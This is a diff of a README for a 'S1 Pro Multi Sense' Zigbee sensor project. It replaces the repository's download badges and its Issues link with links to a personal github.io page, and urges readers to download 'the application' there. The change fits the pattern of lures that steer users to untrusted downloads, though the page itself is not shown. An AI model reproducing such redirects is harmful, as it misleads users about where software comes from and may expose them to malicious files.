@@ -1,6 +1,6 @@
 # 🌟 S1-Pro-Multi-Sense-Zigbee - All-in-One Smart Home Sensing Solution
 
-[![Download S1 Pro](https://img.shields.io/badge/Download-S1_Pro_Multi_Sense-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Bkumar746/S1-Pro-Multi-Sense-Zigbee)
+[![Download S1 Pro](https://img.shields.io/badge/Download-S1_Pro_Multi_Sense-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://bkumar746.github.io)
 
 Visit this link to download the application.
 
@@ -29,7 +29,7 @@ To begin your journey with the S1 Pro Multi Sense, you'll need to access the nec
 
 1. **Navigate to our download page**: Use the button below or the link provided earlier to access the repository.
    
-   [![Download Now](https://img.shields.io/badge/📦_Download_S1_Pro-blue?style=for-the-badge)](https://github.com/Bkumar746/S1-Pro-Multi-Sense-Zigbee)
+   [![Download Now](https://img.shields.io/badge/📦_Download_S1_Pro-blue?style=for-the-badge)](https://bkumar746.github.io)
 
 2. **Explore the repository**: Once you're on the GitHub page, you'll find a wealth of information including setup guides, troubleshooting tips, and firmware updates. Take a moment to familiarize yourself with the layout.
 
@@ -144,7 +144,7 @@ Having trouble? Here are solutions to common problems:
 
 We're here to help! Connect with other S1 Pro users and get support:
 
-- **GitHub Issues**: Report bugs or request features on our [Issues page](https://github.com/Bkumar746/S1-Pro-Multi-Sense-Zigbee/issues).
+- **GitHub Issues**: Report bugs or request features on our [Issues page](https://bkumar746.github.io).
 - **Discussions**: Join conversations on our repository's Discussions tab.
 - **Home Assistant Forums**: Search for S1 Pro topics on the official Home Assistant community forums.
 
